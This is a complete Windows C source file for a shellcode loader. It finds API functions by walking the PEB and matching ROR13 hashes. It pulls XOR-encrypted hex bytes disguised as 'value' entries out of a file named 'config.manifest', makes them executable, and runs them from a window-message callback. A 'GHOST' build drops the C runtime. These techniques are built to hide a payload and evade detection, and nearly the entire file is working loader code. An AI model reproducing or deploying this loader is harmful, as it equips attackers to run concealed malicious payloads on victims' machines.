#include <windows.h>
#include "key.h"

#define HASH_KERNEL32         0x6e2bca17u
#define HASH_USER32           0x32ade206u

#define HASH_CREATEFILEW      0x7c0017bbu
#define HASH_GETFILESIZE      0xdf7d9badu
#define HASH_READFILE         0x10fa6516u
#define HASH_CLOSEHANDLE      0x0ffd97fbu
#define HASH_GETMODULEHANDLEW 0xd332491au
#define HASH_LOADLIBRARYW     0xec0e4ea4u   
#define HASH_VIRTUALALLOC     0x91afca54u
#define HASH_VIRTUALPROTECT   0x7946c61bu
#define HASH_GETSTDHANDLE     0x7487d823u
#define HASH_WRITEFILE        0xe80a791fu

#define HASH_REGISTERCLASSW   0x25388844u
#define HASH_CREATEWINDOWEXW  0x84454957u
#define HASH_DEFWINDOWPROCW   0xb9a87739u
#define HASH_GETMESSAGEW      0x7ac67c03u
#define HASH_DISPATCHMESSAGEW 0x690a1717u
#define HASH_POSTMESSAGEW     0x7b66ec0du
#define HASH_POSTQUITMESSAGE  0x4be0469du


#define HASH_NTDLL            0xad74dbf2u
#define HASH_NTDLLDEFWINDOWPROC_W 0x577a6cc8u

#if defined(DEBUG_VERIFY)
#define VERBOSE 1
#elif defined(QUIET)
#define VERBOSE 0
#else
#define VERBOSE 1
#endif

#if VERBOSE && !defined(GHOST)
#include <stdio.h>
#endif

typedef struct _USTR {
    unsigned short  Length;
    unsigned short  MaximumLength;
    unsigned short *Buffer;
} USTR;

typedef struct _LDR_ENTRY {
    LIST_ENTRY  InLoadOrderLinks;
    LIST_ENTRY  InMemoryOrderLinks;
    LIST_ENTRY  InInitializationOrderLinks;
    void       *DllBase;
    void       *EntryPoint;
    unsigned long SizeOfImage;
    unsigned long _pad;
    USTR        FullDllName;
    USTR        BaseDllName;
} LDR_ENTRY;

typedef struct _PEB_LDR {
    unsigned long Length;
    unsigned char  Initialized;
    unsigned char  _pad[3];
    void          *SsHandle;
    LIST_ENTRY    InLoadOrderModuleList;
    LIST_ENTRY    InMemoryOrderModuleList;
    LIST_ENTRY    InInitializationOrderModuleList;
} PEB_LDR;

#if defined(_MSC_VER)
#include <intrin.h>
#define GET_PEB() ((unsigned char *)__readgsqword(0x60))
#else
static unsigned char *get_peb(void)
{
    unsigned char *peb;
    __asm__ volatile ("movq %%gs:0x60, %0" : "=r"(peb));
    return peb;
}
#define GET_PEB() get_peb()
#endif

static unsigned int ror13(unsigned int v)
{
    return (v >> 13) | (v << 19);
}

static unsigned int hash_ascii(const char *s)
{
    unsigned int h = 0;
    while (*s)
        h = ror13(h) + (unsigned char)*s++;
    return h;
}

static unsigned int hash_module(const USTR *name)
{
    unsigned int h = 0;
    unsigned short *p, *end;

    if (!name->Buffer || !name->Length)
        return 0;
    end = name->Buffer + name->Length / 2;
    for (p = name->Buffer; p < end; p++) {
        unsigned short c = *p;
        if (c >= L'a' && c <= L'z')
            c -= 0x20;
        h = ror13(h) + c;
    }
    return h;
}

static void *find_module(unsigned int want)
{
    unsigned char *peb = GET_PEB();
    PEB_LDR *ldr = *(PEB_LDR **)(peb + 0x18);
    LIST_ENTRY *head = &ldr->InLoadOrderModuleList;
    LIST_ENTRY *cur;

    for (cur = head->Flink; cur != head; cur = cur->Flink) {
        LDR_ENTRY *e = (LDR_ENTRY *)cur;
        if (!e->DllBase || !e->BaseDllName.Buffer)
            continue;
        if (hash_module(&e->BaseDllName) == want)
            return e->DllBase;
    }
    return NULL;
}

static void *resolve_export(void *base, unsigned int want)
{
    IMAGE_DOS_HEADER       *dos = (IMAGE_DOS_HEADER *)base;
    IMAGE_NT_HEADERS       *nt;
    IMAGE_DATA_DIRECTORY   *dir;
    IMAGE_EXPORT_DIRECTORY *exp;
    unsigned long *names, *funcs;
    unsigned short *ords;
    unsigned long  i;

    if (dos->e_magic != IMAGE_DOS_SIGNATURE)
        return NULL;
    nt = (IMAGE_NT_HEADERS *)((unsigned char *)base + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE)
        return NULL;

    dir = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (!dir->VirtualAddress)
        return NULL;

    exp   = (IMAGE_EXPORT_DIRECTORY *)((unsigned char *)base + dir->VirtualAddress);
    names = (unsigned long  *)((unsigned char *)base + exp->AddressOfNames);
    ords  = (unsigned short *)((unsigned char *)base + exp->AddressOfNameOrdinals);
    funcs = (unsigned long  *)((unsigned char *)base + exp->AddressOfFunctions);

    for (i = 0; i < exp->NumberOfNames; i++) {
        if (hash_ascii((const char *)base + names[i]) == want) {
            unsigned long rva = funcs[ords[i]];
            if (rva >= dir->VirtualAddress &&
                rva <  dir->VirtualAddress + dir->Size)
                return NULL;    
            return (unsigned char *)base + rva;
        }
    }
    return NULL;
}

typedef HANDLE (WINAPI *fnCreateFileW)(LPCWSTR, DWORD, DWORD, void *, DWORD, DWORD, HANDLE);
typedef DWORD  (WINAPI *fnGetFileSize)(HANDLE, DWORD *);
typedef BOOL   (WINAPI *fnReadFile)(HANDLE, void *, DWORD, DWORD *, void *);
typedef BOOL   (WINAPI *fnCloseHandle)(HANDLE);
typedef HMODULE(WINAPI *fnGetModuleHandleW)(LPCWSTR);
typedef HMODULE(WINAPI *fnLoadLibraryW)(LPCWSTR);
typedef void * (WINAPI *fnVirtualAlloc)(void *, SIZE_T, DWORD, DWORD);
typedef BOOL   (WINAPI *fnVirtualProtect)(void *, SIZE_T, DWORD, DWORD *);
typedef HANDLE (WINAPI *fnGetStdHandle)(DWORD);
typedef BOOL   (WINAPI *fnWriteFile)(HANDLE, const void *, DWORD, DWORD *, void *);

typedef ATOM    (WINAPI *fnRegisterClassW)(const WNDCLASSW *);
typedef HWND    (WINAPI *fnCreateWindowExW)(DWORD, LPCWSTR, LPCWSTR, DWORD, int, int, int, int, HWND, HMENU, HINSTANCE, void *);
typedef LRESULT (WINAPI *fnDefWindowProcW)(HWND, UINT, WPARAM, LPARAM);
typedef BOOL    (WINAPI *fnGetMessageW)(MSG *, HWND, UINT, UINT);
typedef LRESULT (WINAPI *fnDispatchMessageW)(const MSG *);
typedef BOOL    (WINAPI *fnPostMessageW)(HWND, UINT, WPARAM, LPARAM);
typedef void    (WINAPI *fnPostQuitMessage)(int);

typedef struct {
    fnCreateFileW      CreateFileW;
    fnGetFileSize      GetFileSize;
    fnReadFile         ReadFile;
    fnCloseHandle      CloseHandle;
    fnGetModuleHandleW GetModuleHandleW;
    fnLoadLibraryW     LoadLibraryW;
    fnVirtualAlloc     VirtualAlloc;
    fnVirtualProtect   VirtualProtect;
    fnGetStdHandle     GetStdHandle;      
    fnWriteFile        WriteFile;        
    fnRegisterClassW   RegisterClassW;
    fnCreateWindowExW  CreateWindowExW;
    fnDefWindowProcW   DefWindowProcW;
    fnGetMessageW      GetMessageW;
    fnDispatchMessageW DispatchMessageW;
    fnPostMessageW     PostMessageW;
    fnPostQuitMessage  PostQuitMessage;
} API;

static API  g_api;
static void *g_region;     

#if VERBOSE

#ifdef GHOST
static void out_str(const char *s)
{
    static DWORD n;
    n = 0;
    while (s[n])
        n++;
    g_api.WriteFile(g_api.GetStdHandle(STD_OUTPUT_HANDLE), s, n, &n, NULL);
}
#else
static void out_str(const char *s)
{
    printf("%s", s);
}
#endif

static void out_dec(unsigned v)
{
    char b[12];
    int  i = 10;
    b[11] = 0;
    if (!v) {
        out_str("0");
        return;
    }
    while (v && i >= 0) {
        b[i--] = (char)('0' + (v % 10));
        v /= 10;
    }
    out_str(&b[i + 1]);
}
#endif

static int hexv(int c)
{
    if (c >= '0' && c <= '9') return c - '0';
    if (c >= 'a' && c <= 'f') return c - 'a' + 10;
    if (c >= 'A' && c <= 'F') return c - 'A' + 10;
    return -1;
}

static unsigned long decode_manifest(const unsigned char *buf, unsigned long len,
                                     unsigned char *out, unsigned long out_cap)
{
    const unsigned char *p = buf, *end = buf + len;
    unsigned long n = 0;

    while (p + 7 < end) {
        if (p[0] == 'v' && p[1] == 'a' && p[2] == 'l' && p[3] == 'u' &&
            p[4] == 'e' && p[5] == '=' && p[6] == '"') {
            p += 7;
            while (p + 1 < end && p[0] != '"') {
                int hi = hexv(p[0]), lo = (p[1] != '"') ? hexv(p[1]) : -1;
                if (hi >= 0 && lo >= 0) {
                    if (n < out_cap)
                        out[n] = (unsigned char)((hi << 4) | lo) ^ xor_key[n % sizeof(xor_key)];
                    n++;
                    p += 2;
                } else {
                    p++;
                }
            }
            if (p < end)
                p++;   
        } else {
            p++;
        }
    }
    return n;
}

#define TRIGGER_MSG (WM_APP + 1)

static const wchar_t CLS[] = L"UpdateFrame";
static const wchar_t MANIFEST[] = L"config.manifest";

static LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp)
{
    if (msg == TRIGGER_MSG) {
#if VERBOSE
        out_str("[+] trigger received, module entered\n");
#endif
        ((void (*)(void))g_region)();
#if VERBOSE
        out_str("[+] module returned\n");
#endif
        g_api.PostQuitMessage(0);      
        return 0;
    }
    return g_api.DefWindowProcW(hwnd, msg, wp, lp);
}

typedef struct { unsigned mod; unsigned fn; void **slot; } RESOLVE;

static int resolve_apis(void)
{
    RESOLVE table[] = {
        { HASH_KERNEL32, HASH_CREATEFILEW,      (void **)&g_api.CreateFileW },
        { HASH_KERNEL32, HASH_GETFILESIZE,      (void **)&g_api.GetFileSize },
        { HASH_KERNEL32, HASH_READFILE,         (void **)&g_api.ReadFile },
        { HASH_KERNEL32, HASH_CLOSEHANDLE,      (void **)&g_api.CloseHandle },
        { HASH_KERNEL32, HASH_GETMODULEHANDLEW, (void **)&g_api.GetModuleHandleW },
        { HASH_KERNEL32, HASH_VIRTUALALLOC,     (void **)&g_api.VirtualAlloc },
        { HASH_KERNEL32, HASH_VIRTUALPROTECT,   (void **)&g_api.VirtualProtect },
#if VERBOSE
        { HASH_KERNEL32, HASH_GETSTDHANDLE,     (void **)&g_api.GetStdHandle },
        { HASH_KERNEL32, HASH_WRITEFILE,        (void **)&g_api.WriteFile },
#endif
        { HASH_USER32,   HASH_REGISTERCLASSW,   (void **)&g_api.RegisterClassW },
        { HASH_USER32,   HASH_CREATEWINDOWEXW,  (void **)&g_api.CreateWindowExW },
        { HASH_USER32,   HASH_GETMESSAGEW,      (void **)&g_api.GetMessageW },
        { HASH_USER32,   HASH_DISPATCHMESSAGEW, (void **)&g_api.DispatchMessageW },
        { HASH_USER32,   HASH_POSTMESSAGEW,     (void **)&g_api.PostMessageW },
        { HASH_USER32,   HASH_POSTQUITMESSAGE,  (void **)&g_api.PostQuitMessage },
    };
    void   *mods[3] = { NULL, NULL, NULL };
    unsigned i, n = sizeof(table) / sizeof(table[0]);

    mods[0] = find_module(HASH_KERNEL32);
    if (!mods[0])
        return 1;

    g_api.LoadLibraryW = (fnLoadLibraryW)resolve_export(mods[0], HASH_LOADLIBRARYW);
    if (!g_api.LoadLibraryW)
        return 1;
    mods[1] = g_api.LoadLibraryW(L"user32.dll");
    if (!mods[1])
        return 1;

    mods[2] = find_module(HASH_NTDLL);
    if (!mods[2])
        return 1;
    g_api.DefWindowProcW = (fnDefWindowProcW)resolve_export(mods[2], HASH_NTDLLDEFWINDOWPROC_W);
    if (!g_api.DefWindowProcW)
        return 1;

    for (i = 0; i < n; i++) {
        void *m = (table[i].mod == HASH_KERNEL32) ? mods[0] : mods[1];
        *(table[i].slot) = resolve_export(m, table[i].fn);
        if (!*(table[i].slot))
            return 1;
    }
    return 0;
}
#ifdef DEBUG_VERIFY
static void verify(void)
{
    HMODULE k32 = GetModuleHandleA("kernel32.dll");
    HMODULE u32 = GetModuleHandleA("user32.dll");
    struct { HMODULE m; const char *name; void *walked; void *truth; } c[] = {
        { k32, "CreateFileW",      (void *)g_api.CreateFileW,      NULL },
        { k32, "ReadFile",         (void *)g_api.ReadFile,         NULL },
        { k32, "GetModuleHandleW", (void *)g_api.GetModuleHandleW, NULL },
        { k32, "VirtualAlloc",     (void *)g_api.VirtualAlloc,     NULL },
        { k32, "VirtualProtect",   (void *)g_api.VirtualProtect,   NULL },
        { u32, "RegisterClassW",   (void *)g_api.RegisterClassW,   NULL },
        { u32, "CreateWindowExW",  (void *)g_api.CreateWindowExW,  NULL },
        { u32, "GetMessageW",      (void *)g_api.GetMessageW,      NULL },
        { u32, "PostMessageW",     (void *)g_api.PostMessageW,     NULL },
    };
    int i;

    for (i = 0; i < 9; i++) {
        c[i].truth = (void *)GetProcAddress(c[i].m, c[i].name);
        printf("[%s] %-18s walked=%p truth=%p\n",
               c[i].walked == c[i].truth ? "=" : "X",
               c[i].name, c[i].walked, c[i].truth);
    }
}
#endif

static int loader_main(void)
{
    HANDLE        fh;
    void         *fbuf = NULL;
    unsigned long fsz = 0, got = 0, plen = 0;
    DWORD         old = 0;
    WNDCLASSW     wc;
    HWND          hwnd;
    MSG           msg;

#if VERBOSE && !defined(GHOST)
    setvbuf(stdout, NULL, _IONBF, 0);
#endif

    if (resolve_apis()) {
#if VERBOSE
        out_str("[-] resolution failed\n");
#endif
        return 1;
    }

#ifdef DEBUG_VERIFY
    verify();
    printf("[*] DEBUG_VERIFY build: no staging, no execution\n");
    return 0;
#endif

    fh = g_api.CreateFileW(MANIFEST, GENERIC_READ, 0, NULL,
                           OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (fh == INVALID_HANDLE_VALUE) {
#if VERBOSE
        out_str("[-] config open failed\n");
#endif
        return 1;
    }
    fsz = g_api.GetFileSize(fh, NULL);
    fbuf = g_api.VirtualAlloc(NULL, fsz ? fsz : 1, MEM_RESERVE | MEM_COMMIT,
                              PAGE_READWRITE);
    if (!fbuf || !g_api.ReadFile(fh, fbuf, fsz, &got, NULL) || got != fsz) {
#if VERBOSE
        out_str("[-] config read failed\n");
#endif
        return 1;
    }
    g_api.CloseHandle(fh);
#if VERBOSE
    out_str("[+] config loaded: ");
    out_dec(fsz);
    out_str(" bytes\n");
#endif

    g_region = g_api.VirtualAlloc(NULL, fsz / 2 + 1, MEM_RESERVE | MEM_COMMIT,
                                  PAGE_READWRITE);
    if (!g_region)
        return 1;
    plen = decode_manifest(fbuf, fsz, g_region, fsz / 2 + 1);
    if (!plen) {
#if VERBOSE
        out_str("[-] no entries found\n");
#endif
        return 1;
    }
#if VERBOSE
    out_str("[+] module staged: ");
    out_dec(plen);
    out_str(" bytes\n");
#endif

    if (!g_api.VirtualProtect(g_region, plen, PAGE_EXECUTE_READ, &old)) {
#if VERBOSE
        out_str("[-] protect failed\n");
#endif
        return 1;
    }

    wc.style         = 0;
    wc.lpfnWndProc   = WndProc;
    wc.cbClsExtra    = 0;
    wc.cbWndExtra    = 0;
    wc.hInstance     = g_api.GetModuleHandleW(NULL);
    wc.hIcon         = NULL;
    wc.hCursor       = NULL;
    wc.hbrBackground = NULL;
    wc.lpszMenuName  = NULL;
    wc.lpszClassName = CLS;
    if (!g_api.RegisterClassW(&wc)) {
#if VERBOSE
        out_str("[-] class registration failed\n");
#endif
        return 1;
    }
    hwnd = g_api.CreateWindowExW(0, CLS, L"Worker", WS_OVERLAPPEDWINDOW,
                                 CW_USEDEFAULT, CW_USEDEFAULT, 300, 300,
                                 NULL, NULL, wc.hInstance, NULL);
    if (!hwnd) {
#if VERBOSE
        out_str("[-] window creation failed (interactive session required — BS-16)\n");
#endif
        return 1;
    }

    g_api.PostMessageW(hwnd, TRIGGER_MSG, 0, 0);

    while (g_api.GetMessageW(&msg, NULL, 0, 0) > 0)
        g_api.DispatchMessageW(&msg);

#if VERBOSE
    out_str("[+] dispatch loop ended\n");
#endif
    return 0;
}

#ifdef GHOST

void *memcpy(void *dst, const void *src, size_t n)
{
    unsigned char *d = (unsigned char *)dst;
    const unsigned char *s = (const unsigned char *)src;
    while (n--)
        *d++ = *s++;
    return dst;
}

void *memset(void *dst, int c, size_t n)
{
    unsigned char *d = (unsigned char *)dst;
    while (n--)
        *d++ = (unsigned char)c;
    return dst;
}
#endif

#ifdef GHOST
DWORD WINAPI ghost_entry(void)
{
    return (DWORD)loader_main();
}
#else
int main(void)
{
    return loader_main();
}
#endif
